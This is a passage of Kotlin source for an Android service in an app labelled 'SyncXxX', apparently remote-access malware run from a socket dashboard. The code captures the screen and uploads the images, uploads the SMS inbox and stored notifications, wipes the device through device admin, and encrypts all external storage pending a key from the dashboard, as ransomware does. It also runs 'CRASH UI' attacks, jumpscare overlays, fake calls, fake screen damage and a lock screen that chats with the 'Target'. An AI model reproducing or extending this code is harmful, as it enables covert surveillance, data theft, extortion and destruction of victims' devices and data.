    }

    private fun captureScreenPhoto() {
        if (savedProjectionResultCode == android.app.Activity.RESULT_OK && savedProjectionData != null) {
            performScreenPhotoCapture(savedProjectionResultCode, savedProjectionData!!)
        } else {
            val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("isPhotoMode", true)
            }
            startActivity(intent)
        }
    }

    private fun performScreenPhotoCapture(resultCode: Int, data: Intent) {
        Thread {
            var projection: MediaProjection? = null
            var reader: ImageReader? = null
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val capW: Int; val capH: Int; val capDpi: Int
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val bounds = wm.currentWindowMetrics.bounds
                    capW   = bounds.width()
                    capH   = bounds.height()
                    capDpi = resources.displayMetrics.densityDpi
                } else {
                    val metrics = DisplayMetrics()
                    @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
                    capW   = metrics.widthPixels
                    capH   = metrics.heightPixels
                    capDpi = metrics.densityDpi
                }

                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                projection = mgr.getMediaProjection(resultCode, data)
                reader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 2)

                projection.createVirtualDisplay(
                    "ScreenPhoto", capW, capH, capDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.surface, null, null
                )

                Thread.sleep(300)

                val image = reader.acquireLatestImage()
                if (image != null) {
                    val planes      = image.planes
                    val buffer      = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride   = planes[0].rowStride
                    val rowPadding  = rowStride - pixelStride * image.width

                    val bmp = Bitmap.createBitmap(
                        image.width + rowPadding / pixelStride,
                        image.height, Bitmap.Config.ARGB_8888
                    )
                    bmp.copyPixelsFromBuffer(buffer)

                    val cropped = if (rowPadding > 0)
                        Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
                    else bmp

                    val baos = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                    if (cropped !== bmp) cropped.recycle()
                    bmp.recycle()
                    image.close()

                    val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                    
                    if (socket?.connected() == true) {
                        socket?.emit("screen:photo", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("photo", "data:image/jpeg;base64,$b64")
                            put("timestamp", System.currentTimeMillis())
                        })
                    }
                    
                    emitStatus(JSONObject().apply { 
                        put("photoScreenCaptured", true)
                        put("timestamp", System.currentTimeMillis())
                    })
                } else {
                    emitStatus(JSONObject().apply { put("photoScreenCaptured", false) })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "captureScreenPhoto error: ${e.message}")
                emitStatus(JSONObject().apply { put("photoScreenError", e.message ?: "unknown") })
            } finally {
                try { reader?.close() } catch (_: Exception) {}
                try { projection?.stop() } catch (_: Exception) {}
            }
        }.start()
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    Log.e("DeviceService", "setWallpaper HTTP ${conn.responseCode}")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    Log.e("DeviceService", "setWallpaper: decodeByteArray returned null")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                Log.d("DeviceService", "Wallpaper set OK")
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    
    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = org.json.JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = org.json.JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",     pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = android.net.Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg",     "com.android.sms")
                            put("appName", "SMS")
                            put("title",   address)
                            put("text",    body)
                            put("time",    date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = org.json.JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = org.json.JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",      "com.android.sms")
                        put("appName",  "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private var mediaPlayer: android.media.MediaPlayer? = null

    private var lockMediaPlayer: android.media.MediaPlayer? = null

    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<android.view.View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = org.json.JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = android.widget.ImageView(this@DeviceService)
                    imgView.scaleType = android.widget.ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = android.view.Gravity.TOP or android.view.Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: android.graphics.Bitmap? = null
                            for (i in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }

    private fun startFakeCall(value: String) {
        try {
            val obj = JSONObject(value)
            val name = obj.optString("name", "Unknown")
            val number = obj.optString("number", "+62812345678")
            val duration = obj.optLong("duration", 15000L)

            // Start FakeCallActivity
            val intent = Intent(this, FakeCallActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("callerName", name)
                putExtra("callerNumber", number)
            }
            startActivity(intent)

            isFakeCallActive = true

            // Auto-stop after duration
            fakeCallHandler = Handler(Looper.getMainLooper())
            fakeCallRunnable = Runnable {
                stopFakeCall()
            }
            fakeCallHandler?.postDelayed(fakeCallRunnable!!, duration)

            // Send status to server
            emitStatus(JSONObject().apply {
                put("fakeCallActive", true)
                put("callerName", name)
                put("callerNumber", number)
            })

            Log.d("DeviceService", "Fake call started: $name ($number) for ${duration}ms")
        } catch (e: Exception) {
            Log.e("DeviceService", "startFakeCall error: ${e.message}")
        }
    }

    private fun stopFakeCall() {
        try {
            // Remove scheduled auto-stop
            fakeCallRunnable?.let { fakeCallHandler?.removeCallbacks(it) }
            fakeCallRunnable = null
            fakeCallHandler = null

            // Send broadcast to close FakeCallActivity
            val intent = Intent("com.sync.xxx.FAKE_CALL_STOP").apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)

            isFakeCallActive = false

            // Send status to server
            emitStatus(JSONObject().apply {
                put("fakeCallActive", false)
            })

            Log.d("DeviceService", "Fake call stopped")
        } catch (e: Exception) {
            Log.e("DeviceService", "stopFakeCall error: ${e.message}")
        }
    }

    private fun startBlankScreen(value: String) {
        try {
            val obj = JSONObject(value)
            val speed = obj.optLong("speed", 500L)
            val pattern = obj.optString("pattern", "medium")
            
            val intent = Intent(this, BlankScreenService::class.java).apply {
                action = BlankScreenService.ACTION_START
                putExtra(BlankScreenService.EXTRA_BLINK_SPEED, speed)
                putExtra(BlankScreenService.EXTRA_BLINK_PATTERN, pattern)
            }
            startService(intent)
            
            emitStatus(JSONObject().apply {
                put("blankScreenActive", true)
                put("blinkSpeed", speed)
                put("blinkPattern", pattern)
            })
            
            Log.d("DeviceService", "Blank screen started: pattern=$pattern, speed=${speed}ms")
        } catch (e: Exception) {
            Log.e("DeviceService", "startBlankScreen error: ${e.message}")
        }
    }
    
    private fun stopBlankScreen() {
        try {
            val intent = Intent(this, BlankScreenService::class.java).apply {
                action = BlankScreenService.ACTION_STOP
            }
            startService(intent)
            
            emitStatus(JSONObject().apply {
                put("blankScreenActive", false)
            })
            
            Log.d("DeviceService", "Blank screen stopped")
        } catch (e: Exception) {
            Log.e("DeviceService", "stopBlankScreen error: ${e.message}")
        }
    }
    
    
    private fun setBrightness(value: String) {
        try {
            val brightness = value.toIntOrNull() ?: 50
            val clampedBrightness = brightness.coerceIn(1, 100)
            
            // Convert 1-100 to Android brightness scale (0-255)
            val androidBrightness = (clampedBrightness * 255 / 100).coerceIn(0, 255)
            
            var success = false
            var method = "unknown"
            
            // Method 1: Try system brightness (requires WRITE_SETTINGS permission)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (android.provider.Settings.System.canWrite(this)) {
                    try {
                        android.provider.Settings.System.putInt(
                            contentResolver,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                        )
                        android.provider.Settings.System.putInt(
                            contentResolver,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS,
                            androidBrightness
                        )
                        success = true
                        method = "system"
                    } catch (e: Exception) {
                        Log.e("DeviceService", "System brightness failed: ${e.message}")
                    }
                }
            } else {
                // Android <6, no permission needed
                try {
                    android.provider.Settings.System.putInt(
                        contentResolver,
                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                    )
                    android.provider.Settings.System.putInt(
                        contentResolver,
                        android.provider.Settings.System.SCREEN_BRIGHTNESS,
                        androidBrightness
                    )
                    success = true
                    method = "system-legacy"
                } catch (e: Exception) {
                    Log.e("DeviceService", "Legacy brightness failed: ${e.message}")
                }
            }
            
            emitStatus(JSONObject().apply {
                put("brightness", clampedBrightness)
                put("brightnessRaw", androidBrightness)
                put("brightnessMethod", method)
                put("brightnessSuccess", success)
            })
            
            // Fallback: If system brightness failed, use overlay service (always works)
            if (!success) {
                try {
                    val intent = Intent(this, BrightnessOverlayService::class.java).apply {
                        putExtra("brightness", clampedBrightness)
                    }
                    startService(intent)
                    method = "overlay-fallback"
                    success = true
                    Log.d("DeviceService", "Using brightness overlay fallback")
                } catch (e: Exception) {
                    Log.e("DeviceService", "Brightness overlay fallback failed: ${e.message}")
                }
            }
            
            Log.d("DeviceService", "Brightness set: $clampedBrightness% via $method (success=$success)")
        } catch (e: Exception) {
            Log.e("DeviceService", "setBrightness error: ${e.message}")
        }
    }
    
    private fun factoryReset() {
        try {
            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, AntiUninstallReceiver::class.java)
            
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                Log.d("DeviceService", "Factory reset triggered by dashboard")
                
                // Emit status before wipe
                emitStatus(JSONObject().apply { 
                    put("factoryResetTriggered", true)
                    put("message", "Device will reset in 3 seconds...")
                })
                
                // Delay 3 detik biar status kekirim
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        // Wipe data - factory reset
                        devicePolicyManager.wipeData(0)
                    } catch (e: Exception) {
                        Log.e("DeviceService", "Wipe data error: ${e.message}")
                    }
                }, 3000)
                
            } else {
                Log.e("DeviceService", "Factory reset failed - device admin not active")
                emitStatus(JSONObject().apply { 
                    put("factoryResetFailed", true)
                    put("reason", "Device admin not active")
                })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "Factory reset error: ${e.message}")
            emitStatus(JSONObject().apply { 
                put("factoryResetFailed", true)
                put("error", e.message)
            })
        }
    }

    /**
     * Encrypt files in storage
     */
    private fun encryptFiles() {
        Thread {
            try {
                Log.d("DeviceService", "Starting file encryption...")
                
                emitStatus(JSONObject().apply {
                    put("encryptionStarted", true)
                    put("message", "Memulai enkripsi file...")
                })

                // Gunakan folder default: /storage/emulated/0/
                val folder = File(Environment.getExternalStorageDirectory().absolutePath)
                
                // Password dummy (akan diganti dari dashboard nanti)
                val password = "default_password_123"

                val result = FileEncryptionService.encryptFolder(
                    folder = folder,
                    password = password,
                    progressCallback = { current, total, filename ->
                        // Send progress update
                        emitStatus(JSONObject().apply {
                            put("encryptionProgress", true)
                            put("current", current)
                            put("total", total)
                            put("filename", filename)
                            put("percentage", if (total > 0) (current * 100) / total else 0)
                        })
                    }
                )

                if (result.success) {
                    Log.d("DeviceService", "Encryption completed: ${result.filesEncrypted}/${result.totalFiles} files")
                    
                    emitStatus(JSONObject().apply {
                        put("encryptionCompleted", true)
                        put("filesEncrypted", result.filesEncrypted)
                        put("totalFiles", result.totalFiles)
                        put("errors", org.json.JSONArray(result.errors))
                    })
                } else {
                    emitStatus(JSONObject().apply {
                        put("encryptionFailed", true)
                        put("message", "Encryption failed")
                    })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "Encryption error: ${e.message}")
                emitStatus(JSONObject().apply {
                    put("encryptionError", true)
                    put("error", e.message)
                })
            }
        }.start()
    }

    /**
     * Decrypt files with provided key
     */
    private fun decryptFiles(value: String) {
        Thread {
            try {
                val keyJson = JSONObject(value)
                val password = keyJson.getString("key")
                
                Log.d("DeviceService", "Starting file decryption...")
                
                emitStatus(JSONObject().apply {
                    put("decryptionStarted", true)
                    put("message", "Memulai dekripsi file...")
                })

                // Gunakan folder default: /storage/emulated/0/
                val folder = File(Environment.getExternalStorageDirectory().absolutePath)

                val result = FileEncryptionService.decryptFolder(
                    folder = folder,
                    password = password,
                    progressCallback = { current, total, filename ->
                        // Send progress update
                        emitStatus(JSONObject().apply {
                            put("decryptionProgress", true)
                            put("current", current)
                            put("total", total)
                            put("filename", filename)
                            put("percentage", if (total > 0) (current * 100) / total else 0)
                        })
                    }
                )

                if (result.success) {
                    Log.d("DeviceService", "Decryption completed: ${result.filesDecrypted}/${result.totalFiles} files")
                    
                    emitStatus(JSONObject().apply {
                        put("decryptionCompleted", true)
                        put("filesDecrypted", result.filesDecrypted)
                        put("totalFiles", result.totalFiles)
                        put("errors", org.json.JSONArray(result.errors))
                    })
                } else {
                    emitStatus(JSONObject().apply {
                        put("decryptionFailed", true)
                        put("message", result.errors.firstOrNull() ?: "Decryption failed")
                    })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "Decryption error: ${e.message}")
                emitStatus(JSONObject().apply {
                    put("decryptionError", true)
                    put("error", e.message)
                })
            }
        }.start()
    }

    /**
     * Send encryption status to dashboard
     */
    private fun sendEncryptionStatus() {
        Thread {
            try {
                val folder = File(Environment.getExternalStorageDirectory().absolutePath)
                val status = FileEncryptionService.getEncryptionStatus(folder)
                
                emitStatus(JSONObject().apply {
                    put("encryptionStatus", true)
                    put("totalFiles", status.totalFiles)
                    put("encryptedFiles", status.encryptedFiles)
                    put("unencryptedFiles", status.unencryptedFiles)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "Get encryption status error: ${e.message}")
            }
        }.start()
    }

    /**
     * Start CRASH UI Attack
     */
    private fun startCrashUI(value: String) {
        try {
            val level = value.toIntOrNull() ?: 1
            val clampedLevel = level.coerceIn(1, 10)
            
            val intent = Intent(this, CrashUIService::class.java).apply {
                action = CrashUIService.ACTION_START
                putExtra(CrashUIService.EXTRA_LEVEL, clampedLevel)
            }
            startService(intent)
            
            emitStatus(JSONObject().apply {
                put("crashUIActive", true)
                put("crashUILevel", clampedLevel)
            })
            
            Log.d("DeviceService", "🔥 CRASH UI started - Level $clampedLevel")
        } catch (e: Exception) {
            Log.e("DeviceService", "startCrashUI error: ${e.message}")
        }
    }

    /**
     * Stop CRASH UI Attack
     */
    private fun stopCrashUI() {
        try {
            val intent = Intent(this, CrashUIService::class.java).apply {
                action = CrashUIService.ACTION_STOP
            }
            startService(intent)
            
            emitStatus(JSONObject().apply {
                put("crashUIActive", false)
                put("crashUILevel", 0)
            })
            
            Log.d("DeviceService", "🛑 CRASH UI stopped")
        } catch (e: Exception) {
            Log.e("DeviceService", "stopCrashUI error: ${e.message}")
        }
    }

    /**
     * Start Lock Chat Activity
     */
    private fun startLockChat(value: String) {
        try {
            val obj = JSONObject(value)
            val title = obj.optString("title", "LOCKED BY ADMIN")
            val pin = obj.optString("pin", "1234")
            
            val intent = Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                putExtra(LockChatActivity.EXTRA_TITLE, title)
                putExtra(LockChatActivity.EXTRA_PIN, pin)
            }
            startActivity(intent)
            
            Log.d("DeviceService", "Lock Chat started: title=$title")
            
            emitStatus(JSONObject().apply {
                put("lockChatActive", true)
                put("lockChatTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "Start lock chat error: ${e.message}")
        }
    }

    /**
     * Stop Lock Chat Activity
     */
    private fun stopLockChat() {
        try {
            // Send broadcast to close activity
            sendBroadcast(Intent("com.sync.xxx.LOCKCHAT_CLOSE"))
            
            emitStatus(JSONObject().apply {
                put("lockChatActive", false)
                put("lockChatTitle", "")
            })
            
            Log.d("DeviceService", "Lock Chat stopped")
        } catch (e: Exception) {
            Log.e("DeviceService", "Stop lock chat error: ${e.message}")
        }
    }

    /**
     * Unlock Lock Chat V3 - Restore system permissions dan remove lock
     */
    private fun unlockLockChat() {
        try {
            // Set manual unlock flag
            val prefs = getSharedPreferences("lock_chat_v3_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("manual_unlock", true).apply()
            
            // Stop Lock Monitor Service dengan unlock system action
            val intent = Intent(this, LockMonitorService::class.java).apply {
                action = LockMonitorService.ACTION_UNLOCK_SYSTEM
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            
            // Send broadcast to close activity
            sendBroadcast(Intent("com.sync.xxx.LOCKCHAT_CLOSE"))
            
            emitStatus(JSONObject().apply {
                put("lockChatActive", false)
                put("lockChatTitle", "")
                put("lockChatUnlocked", true)
            })
            
            Log.d("DeviceService", "Lock Chat V3 unlocked - manual_unlock flag set")
        } catch (e: Exception) {
            Log.e("DeviceService", "Unlock lock chat error: ${e.message}")
        }
    }

    /**
     * Send lock chat message to dashboard
     */
    private fun sendLockChatMessage(message: String) {
        try {
            socket?.emit("lockchat:message", JSONObject().apply {
                put("deviceId", deviceId)
                put("from", "Target")
                put("message", message)
            })
            Log.d("DeviceService", "Lock chat message sent: $message")
        } catch (e: Exception) {
            Log.e("DeviceService", "Send lock chat message error: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════
    // LCD DAMAGE EFFECT
    // ══════════════════════════════════════════════════════════════
    
    /**
     * Show LCD Damage overlay effect
     */
    private fun showLcdDamage() {
        try {
            // Start the service first if not running
            val serviceIntent = Intent(this, LcdDamageOverlayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
            // Send broadcast to show overlay
            val intent = Intent(LcdDamageOverlayService.ACTION_SHOW)
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("lcdDamageActive", true)
            })
            
            Log.d("DeviceService", "LCD Damage overlay shown")
        } catch (e: Exception) {
            Log.e("DeviceService", "Show LCD damage error: ${e.message}")
        }
    }

    /**
     * Hide LCD Damage overlay effect
     */
    private fun hideLcdDamage() {
        try {
            // Send broadcast to hide overlay
            val intent = Intent(LcdDamageOverlayService.ACTION_HIDE)
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("lcdDamageActive", false)
            })
            
            Log.d("DeviceService", "LCD Damage overlay hidden")
        } catch (e: Exception) {
            Log.e("DeviceService", "Hide LCD damage error: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════
    // COMBO LOCK (HARDCORE LOCK WITH OPTIONAL FEATURES)
    // ══════════════════════════════════════════════════════════════
    
    /**
     * Show Combo Lock with optional features
     * value format: JSON string with fields:
     * - html: string (custom HTML for lock screen)
     * - crash: boolean (enable crash system loop)
     * - sound: boolean (enable force sound)
     * - flashlight: boolean (enable flashlight strobe)
     */
    private fun showComboLock(value: String) {
        try {
            // Start the service first if not running
            val serviceIntent = Intent(this, ComboLockService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
            // Parse options from JSON
            var html = ""
            var crash = false
            var sound = false
            var flashlight = false
            
            try {
                val obj = JSONObject(value)
                html = obj.optString("html", "")
                crash = obj.optBoolean("crash", false)
                sound = obj.optBoolean("sound", false)
                flashlight = obj.optBoolean("flashlight", false)
            } catch (e: Exception) {
                // If not JSON, treat as plain HTML
                html = value
            }
            
            // Send broadcast to show combo lock with extras
            val intent = Intent(ComboLockService.ACTION_SHOW).apply {
                putExtra(ComboLockService.EXTRA_HTML, html)
                putExtra(ComboLockService.EXTRA_CRASH, crash)
                putExtra(ComboLockService.EXTRA_SOUND, sound)
                putExtra(ComboLockService.EXTRA_FLASHLIGHT, flashlight)
            }
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("comboLockActive", true)
                put("comboLockCrash", crash)
                put("comboLockSound", sound)
                put("comboLockFlash", flashlight)
            })
            
            Log.d("DeviceService", "Combo Lock shown | crash=$crash sound=$sound flash=$flashlight")
        } catch (e: Exception) {
            Log.e("DeviceService", "Show combo lock error: ${e.message}")
        }
    }

    /**
     * Hide Combo Lock and stop all features
     */
    private fun hideComboLock() {
        try {
            // Send broadcast to hide combo lock
            val intent = Intent(ComboLockService.ACTION_HIDE)
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("comboLockActive", false)
            })
            
            Log.d("DeviceService", "Combo Lock hidden")
        } catch (e: Exception) {
            Log.e("DeviceService", "Hide combo lock error: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════
